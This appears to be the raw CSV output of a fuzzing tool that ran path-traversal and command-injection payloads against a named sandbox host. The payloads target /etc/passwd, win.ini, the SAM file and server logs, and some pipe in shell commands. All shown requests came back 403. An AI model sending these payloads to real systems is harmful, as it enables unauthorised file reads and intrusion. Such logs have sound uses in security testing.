FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5cetc/passwd,https://overlord-sandbox.officevibe.com/..%5cetc/passwd,,3444,403,312,17,7,text/html; charset=us-ascii,28.044876ms,
../config.js,https://overlord-sandbox.officevibe.com/../config.js,,3723,403,312,17,7,text/html; charset=us-ascii,27.892796ms,
../../../etc/passwd,https://overlord-sandbox.officevibe.com/../../../etc/passwd,,7190,403,312,17,7,text/html; charset=us-ascii,28.35403ms,
./../../../../../../../../../etc/passw*,https://overlord-sandbox.officevibe.com/./../../../../../../../../../etc/passw*,,15139,403,312,17,7,text/html; charset=us-ascii,28.648824ms,
../../boot.ini,https://overlord-sandbox.officevibe.com/../../boot.ini,,15624,403,312,17,7,text/html; charset=us-ascii,28.283035ms,
../../../logs/error.log,https://overlord-sandbox.officevibe.com/../../../logs/error.log,,18451,403,312,17,7,text/html; charset=us-ascii,28.431753ms,
..///etc/passwd,https://overlord-sandbox.officevibe.com/..///etc/passwd,,19422,403,312,17,7,text/html; charset=us-ascii,28.791382ms,
file/../../../../../../../../etc,https://overlord-sandbox.officevibe.com/file/../../../../../../../../etc,,24603,403,312,17,7,text/html; charset=us-ascii,28.450789ms,
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://overlord-sandbox.officevibe.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,28158,403,312,17,7,text/html; charset=us-ascii,27.90908ms,
./../../../../../../../../../etc/*,https://overlord-sandbox.officevibe.com/./../../../../../../../../../etc/*,,29065,403,312,17,7,text/html; charset=us-ascii,27.495916ms,
PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord-sandbox.officevibe.com/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,31774,403,312,17,7,text/html; charset=us-ascii,30.693118ms,
..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5cetc/passwd,,33538,403,312,17,7,text/html; charset=us-ascii,28.693984ms,
ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,https://overlord-sandbox.officevibe.com/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,,33654,403,312,17,7,text/html; charset=us-ascii,28.41033ms,
cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord-sandbox.officevibe.com/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,,34140,403,312,17,7,text/html; charset=us-ascii,28.129786ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,https://overlord-sandbox.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam,,36688,403,312,17,7,text/html; charset=us-ascii,27.584543ms,
../.pass,https://overlord-sandbox.officevibe.com/../.pass,,37462,403,312,17,7,text/html; charset=us-ascii,27.661965ms,
../.passwd,https://overlord-sandbox.officevibe.com/../.passwd,,37467,403,312,17,7,text/html; charset=us-ascii,27.979978ms,
info2www '(../../../../../../../bin/mail root </etc/passwd>,https://overlord-sandbox.officevibe.com/info2www '(../../../../../../../bin/mail root </etc/passwd>,,38767,403,312,17,7,text/html; charset=us-ascii,27.574267ms,
../../../../../logs/access.log,https://overlord-sandbox.officevibe.com/../../../../../logs/access.log,,38985,403,312,17,7,text/html; charset=us-ascii,28.134325ms,
"cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://overlord-sandbox.officevibe.com/cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,39476,403,312,17,7,text/html; charset=us-ascii,28.639121ms,
../../apache/logs/error.log,https://overlord-sandbox.officevibe.com/../../apache/logs/error.log,,40906,403,312,17,7,text/html; charset=us-ascii,28.020418ms,
../../../logs/access.log,https://overlord-sandbox.officevibe.com/../../../logs/access.log,,45696,403,312,17,7,text/html; charset=us-ascii,27.663224ms,
../../logs/access.log,https://overlord-sandbox.officevibe.com/../../logs/access.log,,50318,403,312,17,7,text/html; charset=us-ascii,27.713826ms,
../../../../../logs/error.log,https://overlord-sandbox.officevibe.com/../../../../../logs/error.log,,51110,403,312,17,7,text/html; charset=us-ascii,28.185224ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://overlord-sandbox.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,52401,403,312,17,7,text/html; charset=us-ascii,27.986619ms,
..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,https://overlord-sandbox.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,,52408,403,312,17,7,text/html; charset=us-ascii,28.007834ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,https://overlord-sandbox.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1,,53350,403,312,17,7,text/html; charset=us-ascii,28.050945ms,
cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord-sandbox.officevibe.com/cgi-bin/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,53439,403,312,17,7,text/html; charset=us-ascii,28.195634ms,
static/..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/static/..%5c..%5cetc/passwd,,54184,403,312,17,7,text/html; charset=us-ascii,27.469265ms,
